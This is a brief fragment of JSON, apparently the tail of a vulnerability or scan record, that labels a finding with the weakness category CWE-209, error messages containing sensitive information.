                "value": "CWE-209 Generation of Error Message Containing Sensitive Information"
            }
        ]
    }
}